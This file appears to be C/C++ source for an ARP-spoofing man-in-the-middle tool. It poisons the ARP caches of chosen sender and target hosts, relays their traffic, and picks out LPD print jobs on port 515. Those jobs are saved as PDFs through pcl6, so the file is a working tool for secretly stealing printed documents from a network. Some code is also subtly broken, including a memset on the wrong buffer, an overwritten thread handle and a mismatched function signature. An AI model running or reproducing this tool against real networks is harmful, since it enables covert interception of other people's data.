#include <stdio.h>
#include <string.h>
#include <libnet.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <pthread.h>
#include <time.h>
#include "my_thr.h"

#define BUFSIZE 0x8000

typedef struct _MyInfo {
    uint8_t my_mac[6];
    uint8_t my_ip[4];
} MyInfo;

static char *dev;
static uint count;
static MyInfo *my_info;

static bool data_check = false;
static u_char data[0x1000000] = { 0x00, };
static size_t data_len = 0;
static uint16_t id_list[0x100] = { 0x0000 };
static int id_count = 0;
static uint32_t pre_seq = 0;

void get_myinfo(MyInfo *my_info);
void print_mac(const u_char *mac);
void print_ip(const u_char *ip);
void print_ip(struct in_addr ip);
void print_packet(const u_char *packet, int len);

int arp_request(pcap_t *fp, bool is_sender, ip_set set);
int arp_reply(pcap_t *fp, struct my_arp_hdr *a_hdr, bool is_sender, ip_set set);
int send_arp(pcap_t *fp, const struct my_arp_hdr *a_hdr, ip_set set, bool is_sender);

void make_pdf();
bool check_seq(uint32_t seq);
bool check_id(uint16_t id);
int find_index(u_char *s1, u_char *s2, int *len, int size);
int recv_icmp(pcap_t *fp, struct libnet_ethernet_hdr *ether_hdr, struct libnet_ipv4_hdr *ip_hdr, u_char *buf);
int send_icmp(pcap_t *fp, ip_set set, u_char *buf, int len);

void *thr_send_arp(void *arg);
void *thr_recv_send_icmp(void *arg);

int main(int argc, char* argv[]) {
    pcap_t *fp;
    pthread_t *arp_thr;
    ip_set *ip_sets;
    struct my_arp_hdr arp_hdr_s, arp_hdr_t;
    char errbuf[PCAP_ERRBUF_SIZE];
    int tid;

    my_info = reinterpret_cast<MyInfo *>(malloc(sizeof(MyInfo)));

    if(argc < 4) {
        printf("Usage: ./send_arp <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
        return -1;
    }
    else if(argc % 2 != 0) {
        printf("Usage: ./send_arp <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
        return -1;
    }

    dev = argv[1];
    count = static_cast<unsigned int>((argc - 2) / 2);
    printf("[*] Set count: %d\n", count);

    arp_thr = reinterpret_cast<pthread_t *>(malloc(count * sizeof(pthread_t)));
    if(arp_thr == nullptr) {
        fprintf(stderr, "arp_thr malloc fail...\n");
        return -1;
    }
    memset(arp_thr, 0, count * sizeof(pthread_t));

    ip_sets = reinterpret_cast<ip_set *>(malloc(count * sizeof(ip_set)));
    if(ip_sets == nullptr) {
        fprintf(stderr, "ip_sets malloc fail...\n");
        return -1;
    }
    memset(arp_thr, 0, count * sizeof(ip_set));

    for(uint i = 0; i < count; i++) {
        ip_sets[i].sender_ip = argv[(i+1)*2];
        ip_sets[i].target_ip = argv[(i+1)*2+1];
    }

    get_myinfo(my_info);
    printf("[*] Attacker ");
    print_mac(my_info->my_mac);
    printf("[*] Attacker ");
    print_ip(my_info->my_ip);

    if((fp = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf)) == nullptr) {
        fprintf(stderr, "Couldn't open device %s \n", errbuf);
        return -1;
    }

    for(uint i = 0; i < count; i++) {
        printf("[*] Set %d\n", i+1);

        // sender
        if(arp_request(fp, true, ip_sets[i])) {
            fprintf(stderr, "[%d] sender arp_request fail...\n", i+1);
            continue;
        }

        if(arp_reply(fp, &arp_hdr_s, true, ip_sets[i])) {
            fprintf(stderr, "[%d] sender arp_reply fail...\n", i+1);
            continue;
        }

        // target
        if(arp_request(fp, false, ip_sets[i])) {
            fprintf(stderr, "[%d] target arp_request fail...\n", i+1);
            continue;
        }

        if(arp_reply(fp, &arp_hdr_t, false, ip_sets[i])) {
            fprintf(stderr, "[%d] target arp_reply fail...\n", i+1);
            continue;
        }

        struct thr_arg_arp t_arg_arp = { fp, &arp_hdr_s, &arp_hdr_t, ip_sets[i] };
        tid = pthread_create(&arp_thr[i], nullptr, thr_send_arp, reinterpret_cast<void *>(&t_arg_arp));
        if(tid) {
            fprintf(stderr, "pthread_create error.\n");
            exit(1);
        }

        struct thr_arg_icmp t_arg_icmp = { fp, &arp_hdr_s, &arp_hdr_t };
        tid = pthread_create(&arp_thr[i], nullptr, thr_recv_send_icmp, reinterpret_cast<void *>(&t_arg_icmp));
        if(tid) {
            fprintf(stderr, "pthread_create error.\n");
            exit(1);
        }
    }

    for(uint i = 0; i < count; i++) {
        pthread_join(arp_thr[i], nullptr);
    }

    free(arp_thr);
    free(ip_sets);
    pcap_close(fp);

    return 0;
}

void get_myinfo(MyInfo *my_info) {
    struct ifreq info;
    int sock = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);

    strcpy(info.ifr_name, dev);
    ioctl(sock, SIOCGIFHWADDR, &info);
    for (int i = 0; i < 6; i++)
        my_info->my_mac[i] = static_cast<unsigned char>(info.ifr_ifru.ifru_hwaddr.sa_data[i]);

    ioctl(sock, SIOCGIFADDR, &info);
    for (int i = 2; i < 6; ++i) {
        my_info->my_ip[i-2] = static_cast<unsigned char>(info.ifr_ifru.ifru_addr.sa_data[i]);
    }
    close(sock);
}

void print_mac(const u_char *mac) {
    printf("Mac = ");
    for(int i = 0; i < 6; i++) {
        if(i < 5) printf("%02x:", mac[i]);
        else printf("%02x", mac[i]);
    }
    printf("\n");
}

void print_ip(const u_char *ip) {
    printf("IP = ");
    for(int i = 0; i < 4; i++) {
        if(i < 3) printf("%d.", ip[i]);
        else printf("%d", ip[i]);
    }
    printf("\n");
}

void print_ip(struct in_addr ip) {
    printf("IP = ");
    printf("%s\n", inet_ntoa(ip));
}

void print_packet(const u_char *packet, int len) {
    printf("================================================\n");
    for(int i = 1; i <= len; i++) {
        printf("%02X ", packet[i-1]);
        if(i % 8 == 0) printf(" ");
        if(i % 16 == 0) printf("\n");
    }
    printf("\n================================================\n");
}

int arp_request(pcap_t *fp, bool is_sender, ip_set set) {
    struct libnet_ethernet_hdr *ether_hdr = reinterpret_cast<libnet_ethernet_hdr *>(malloc(sizeof(libnet_ethernet_hdr)));
    struct my_arp_hdr *arp_hdr = reinterpret_cast<my_arp_hdr *>(malloc(sizeof(my_arp_hdr)));
    struct in_addr addr;
    u_char packet[sizeof(struct libnet_ethernet_hdr) + sizeof(struct my_arp_hdr)];

    memset(ether_hdr, 0, sizeof(libnet_ethernet_hdr));
    memset(arp_hdr, 0, sizeof(my_arp_hdr));

    /* set ether_hdr */
    memset(ether_hdr->ether_dhost, 0xff, ETHER_ADDR_LEN);
    memcpy(ether_hdr->ether_shost, my_info->my_mac, ETHER_ADDR_LEN);
    ether_hdr->ether_type = htons(ETHERTYPE_ARP);

    /* set arp_hdr */
    arp_hdr->ar_hrd = htons(ARPHRD_ETHER);                   /* format of hardware address */
    arp_hdr->ar_pro = htons(ETHERTYPE_IP);                   /* format of protocol address */
    arp_hdr->ar_hln = MAC_LEN;                               /* length of hardware address */
    arp_hdr->ar_pln = IP_LEN;                                /* length of protocol addres */
    memcpy(arp_hdr->ar_sha, my_info->my_mac, MAC_LEN);
    memcpy(arp_hdr->ar_spa, &(my_info->my_ip), IP_LEN);
    memset(arp_hdr->ar_tha, 0x00, MAC_LEN);

    if(is_sender) {
        inet_pton(AF_INET, set.sender_ip, &addr);
    }
    else {
        inet_pton(AF_INET, set.target_ip, &addr);
    }
    memcpy(arp_hdr->ar_tpa, &addr, IP_LEN);
    arp_hdr->ar_op = htons(ARPOP_REQUEST);

    memcpy(packet, ether_hdr, sizeof(struct libnet_ethernet_hdr));
    memcpy(packet + sizeof(struct libnet_ethernet_hdr), arp_hdr, sizeof(struct my_arp_hdr));

    printf("================================================\n");
    printf("                  ARP_REQUEST                   \n");
    print_packet(packet, sizeof(packet));

    if (pcap_sendpacket(fp, packet, sizeof(packet)) == -1) {
        fprintf(stderr, "pcap_sendpacket: %s", pcap_geterr(fp));
        return 1;
    }

    return 0;
}

int arp_reply(pcap_t *fp, struct my_arp_hdr *a_hdr, bool is_sender, ip_set set) {
    const struct libnet_ethernet_hdr *ether_hdr;
    struct pcap_pkthdr *pkthdr;
    const u_char *packet;
    struct in_addr addr1, addr2;
    int res = 0, count = 0;

    printf("================================================\n");
    printf("                   ARP_REPLY                    \n");

    while(true) {
        while((res = pcap_next_ex(fp, &pkthdr, &packet)) == 0) {
            if(res == -1) {
                printf("Corrupted input file.\n");
                return 1;
            }
        }

        if(count == 30) {
            printf("Time out.\n");
            return 1;
        }

        ether_hdr = reinterpret_cast<const libnet_ethernet_hdr*>(packet);
        if(ntohs(ether_hdr->ether_type) == ETHERTYPE_ARP) {
            memcpy(a_hdr, packet + sizeof(libnet_ethernet_hdr), sizeof(my_arp_hdr));

            inet_pton(AF_INET, set.sender_ip, &addr1);
            inet_pton(AF_INET, set.target_ip, &addr2);

            if(is_sender && !memcmp(&(a_hdr->ar_spa), &addr1, sizeof(struct in_addr))) {
                print_packet(packet, 42);
                printf("[*] Sender ");
                print_mac(a_hdr->ar_sha);
                break;
            }
            else if(!is_sender && !memcmp(&(a_hdr->ar_spa), &addr2, sizeof(struct in_addr))) {
                print_packet(packet, 42);
                printf("[*] Target ");
                print_mac(a_hdr->ar_sha);
                break;
            }
        }
        count++;
    }

    return 0;
}

int send_arp(pcap_t *fp, const struct my_arp_hdr *a_hdr, ip_set set, bool is_sender) {
    struct libnet_ethernet_hdr *ether_hdr = reinterpret_cast<libnet_ethernet_hdr *>(malloc(sizeof(libnet_ethernet_hdr)));
    struct my_arp_hdr *arp_hdr = reinterpret_cast<my_arp_hdr *>(malloc(sizeof(my_arp_hdr)));
    struct in_addr addr1, addr2;
    u_char packet[sizeof(struct libnet_ethernet_hdr) + sizeof(struct my_arp_hdr)];

    memset(ether_hdr, 0, sizeof(libnet_ethernet_hdr));
    memset(arp_hdr, 0, sizeof(my_arp_hdr));

    /* set ether_hdr */
    memcpy(ether_hdr->ether_dhost, a_hdr->ar_sha, ETHER_ADDR_LEN);
    memcpy(ether_hdr->ether_shost, my_info->my_mac, ETHER_ADDR_LEN);
    ether_hdr->ether_type = htons(ETHERTYPE_ARP);

    /* set arp_hdr */
    arp_hdr->ar_hrd = htons(ARPHRD_ETHER);                   /* format of hardware address */
    arp_hdr->ar_pro = htons(ETHERTYPE_IP);                   /* format of protocol address */
    arp_hdr->ar_hln = MAC_LEN;                               /* length of hardware address */
    arp_hdr->ar_pln = IP_LEN;                                /* length of protocol addres */

    if(is_sender) {
        inet_pton(AF_INET, set.target_ip, &addr1);
        inet_pton(AF_INET, set.sender_ip, &addr2);
    }
    else {
        inet_pton(AF_INET, set.sender_ip, &addr1);
        inet_pton(AF_INET, set.target_ip, &addr2);
    }

    memcpy(arp_hdr->ar_sha, my_info->my_mac, MAC_LEN);
    memcpy(arp_hdr->ar_spa, &addr1, IP_LEN);
    memcpy(arp_hdr->ar_tha, a_hdr->ar_sha, MAC_LEN);
    memcpy(arp_hdr->ar_tpa, &addr2, IP_LEN);
    arp_hdr->ar_op = htons(ARPOP_REPLY);

    memcpy(packet, ether_hdr, sizeof(struct libnet_ethernet_hdr));
    memcpy(packet + sizeof(struct libnet_ethernet_hdr), arp_hdr, sizeof(struct my_arp_hdr));

    /*
    printf("================================================\n");
    printf("                    SEND_ARP                    \n");
    print_packet(packet, sizeof(packet));
    */

    if(pcap_sendpacket(fp, packet, sizeof(packet)) == -1) {
        fprintf(stderr, "pcap_sendpacket: %s", pcap_geterr(fp));
        return 1;
    }

    return 0;
}

int recv_icmp(pcap_t *fp, struct libnet_ethernet_hdr *ether_hdr, struct libnet_ipv4_hdr *ip_hdr, u_char *buf) {
    struct libnet_tcp_hdr *tcp_hdr = reinterpret_cast<libnet_tcp_hdr *>(malloc(sizeof(libnet_tcp_hdr)));
    struct pcap_pkthdr *pkthdr;
    const u_char *packet;
    int res = 0, len = 0;

    while(true) {
        while((res = pcap_next_ex(fp, &pkthdr, &packet)) == 0) {
            if(res == -1) {
                printf("Corrupted input file.\n");
                return 1;
            }
        }

        memcpy(ether_hdr, packet, sizeof(struct libnet_ethernet_hdr));
        if(ntohs(ether_hdr->ether_type) != ETHERTYPE_IP) {
            continue;
        }

        memcpy(ip_hdr, packet + sizeof(libnet_ethernet_hdr), sizeof(struct libnet_ipv4_hdr));
        memcpy(tcp_hdr, packet + sizeof(libnet_ethernet_hdr) + ip_hdr->ip_hl * 4, sizeof(struct libnet_tcp_hdr));
        if((ip_hdr->ip_p == IPPROTO_TCP && htons(tcp_hdr->th_dport) == 515) || (ip_hdr->ip_p == IPPROTO_TCP && htons(tcp_hdr->th_sport) == 515)) {
            len = sizeof(struct libnet_ethernet_hdr) + ntohs(ip_hdr->ip_len);
            /*
            printf("================================================\n");
            printf("                    RECV_LPD                    \n");
            print_packet(packet, len);
            */

            memcpy(buf, packet, static_cast<size_t>(len));

            return 0;
        }
    }
}

void make_pdf() {
    time_t t = time(nullptr);
    struct tm tm = *localtime(&t);
    char s[20] = { 0, }, cmd[60] = { 0, };

    FILE *fp = fopen("pdfdata", "wb");
    fwrite(data, 1, data_len, fp);
    fclose(fp);

    sprintf(s, "%04d%02d%02d%02d%02d%02d.pdf",
                tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday,
                tm.tm_hour, tm.tm_min, tm.tm_sec
            );
    sprintf(cmd, "./pcl6 -o %s -sDEVICE=pdfwrite pdfdata", s);

    system(cmd);
    system("rm pdfdata");

    /*
    printf("\n\n================================\n");
    for(int i = 1; i <= int(data_len); i++) {
        printf("%02x", data[i-1]);
        if(i % 16 == 0)
            printf("\n");
    }
    printf("\n================================\n\n");
    */
    printf("\n[*] File Saved\n");

    for(int i = 0; i < int(data_len); i++)
        data[i] = 0;
    data_len = 0;
}

bool check_seq(uint32_t seq) {
    if(seq < pre_seq)
        return false;
    pre_seq = seq;
    return true;
}

bool check_id(uint16_t id) {
    for(int i = 0; i < id_count; i++) {
        if(id_list[i] == id) {
            return false;
        }
    }
    id_list[id_count++] = id;
    return true;
}

int find_index(u_char *s1, u_char *s2, int *len, int size) {
    int j = 0;

    for(int i = 0; i < *len; i++) {
        if(s1[i] == s2[j]) {
            for(j = 1; j < size; j++) {
                if(s1[i+j] != s2[j]) {
                    j = 0;
                    break;
                }
            }

            if(j == size) {
                return i;
            }
        }
    }

    return -1;
}

int send_icmp(pcap_t *fp, const struct my_arp_hdr *a_hdr_t, u_char *buf, int len) {
    struct libnet_ethernet_hdr *ether_hdr = reinterpret_cast<libnet_ethernet_hdr *>(malloc(sizeof(libnet_ethernet_hdr)));
    struct libnet_ipv4_hdr *ip_hdr = reinterpret_cast<libnet_ipv4_hdr *>(malloc(sizeof(libnet_ipv4_hdr)));
    struct libnet_tcp_hdr *tcp_hdr = reinterpret_cast<libnet_tcp_hdr *>(malloc(sizeof(libnet_tcp_hdr)));

    memcpy(ether_hdr, buf, sizeof(struct libnet_ethernet_hdr));
    memcpy(ip_hdr, buf + sizeof(libnet_ethernet_hdr), sizeof(struct libnet_ipv4_hdr));
    memcpy(tcp_hdr, buf + sizeof(libnet_ethernet_hdr) + ip_hdr->ip_hl * 4, sizeof(struct libnet_tcp_hdr));

    int index = 0;

    /* set ether_hdr */
    memcpy(ether_hdr->ether_dhost, a_hdr_t->ar_sha, ETHER_ADDR_LEN);
    memcpy(ether_hdr->ether_shost, my_info->my_mac, ETHER_ADDR_LEN);
    ether_hdr->ether_type = htons(ETHERTYPE_IP);

    memcpy(buf, ether_hdr, sizeof(libnet_ethernet_hdr));

    u_char pclxl[] = { 0x29, 0x20, 0x48, 0x50, 0x2D, 0x50, 0x43, 0x4C, 0x20, 0x58, 0x4C };
    u_char pcleof[] = { 0x1B, 0x25, 0x2D, 0x31, 0x32, 0x33, 0x34, 0x35, 0x58, 0x40,
                        0x50, 0x4A, 0x4C, 0x20, 0x45, 0x4F, 0x4A, 0x0D, 0x0A, 0x1B,
                        0x25, 0x2D, 0x31, 0x32, 0x33, 0x34, 0x35, 0x58 };
    size_t data_length = ntohs(ip_hdr->ip_len) - (tcp_hdr->th_off * 4) - (ip_hdr->ip_hl * 4);
    if(data_length != 0 && ip_hdr->ip_p == IPPROTO_TCP && htons(tcp_hdr->th_dport) == 515) {
        if(check_id(ntohs(ip_hdr->ip_id)) && check_seq(ntohl(tcp_hdr->th_seq))) {
            if(data_check) {
                if((index = find_index(buf, pcleof, &len, 28)) != -1) {
                    for(int i = sizeof(struct libnet_ethernet_hdr) + ip_hdr->ip_hl * 4 + tcp_hdr->th_off * 4; i < index; i++) {
                        data[data_len++] = buf[i];
                    }
                    make_pdf();
                    data_check = false;
                } else {
                    for(int i = sizeof(struct libnet_ethernet_hdr) + ip_hdr->ip_hl * 4 + tcp_hdr->th_off * 4; i < len; i++)
                        data[data_len++] = buf[i];
                }
            } else if((index = find_index(buf, pclxl, &len, 11)) != -1) {
                for(int i = index; i < len; i++)
                    data[data_len++] = buf[i];
                data_check = true;
            }
        }
    }

    if (pcap_sendpacket(fp, buf, len) == -1) {
        fprintf(stderr, "pcap_sendpacket: %s", pcap_geterr(fp));
        return 1;
    }

    /*
    printf("================================================\n");
    printf("                    SEND_LPD                    \n");
    print_packet(buf, len);
    */

    return 0;
}

void *thr_send_arp(void *arg) {
    struct thr_arg_arp *t_arg = reinterpret_cast<struct thr_arg_arp *>(arg);

    while(true) {
        if(send_arp(t_arg->fp, t_arg->arp_hdr_s, t_arg->sets, true)) {
            fprintf(stderr, "send_arp (1) fail...\n");
            break;
        }

        if(send_arp(t_arg->fp, t_arg->arp_hdr_t, t_arg->sets, false)) {
            fprintf(stderr, "send_arp (2) fail...\n");
            break;
        }

        sleep(10);
    }

    return nullptr;
}

void *thr_recv_send_icmp(void *arg) {
    struct thr_arg_icmp *t_arg = reinterpret_cast<struct thr_arg_icmp *>(arg);
    struct my_arp_hdr *arp_hdr;
    struct libnet_ethernet_hdr ether_hdr;
    struct libnet_ipv4_hdr ip_hdr;
    int len;
    u_char buf[BUFSIZE];

    while(true) {
        memset(buf, 0, BUFSIZE);

        if(recv_icmp(t_arg->fp, &ether_hdr, &ip_hdr, buf)) {
            fprintf(stderr, "recv_icmp fail...\n");
            break;
        }

        if(!memcmp(t_arg->arp_hdr_s->ar_spa, &ip_hdr.ip_src, sizeof(struct in_addr)) && !memcmp(t_arg->arp_hdr_s->ar_sha, ether_hdr.ether_shost, sizeof(uint8_t)*MAC_LEN)) {
            arp_hdr = t_arg->arp_hdr_t;
        }
        else if(!memcmp(t_arg->arp_hdr_t->ar_spa, &ip_hdr.ip_src, sizeof(struct in_addr)) && !memcmp(t_arg->arp_hdr_t->ar_sha, ether_hdr.ether_shost, sizeof(uint8_t)*MAC_LEN)) {
            arp_hdr = t_arg->arp_hdr_s;
        }
        else {
            continue;
        }

        len = sizeof(struct libnet_ethernet_hdr) + ntohs(ip_hdr.ip_len);
        if(send_icmp(t_arg->fp, arp_hdr, buf, len)) {
            fprintf(stderr, "send_icmp fail...\n");
            break;
        }
    }

    return nullptr;
}
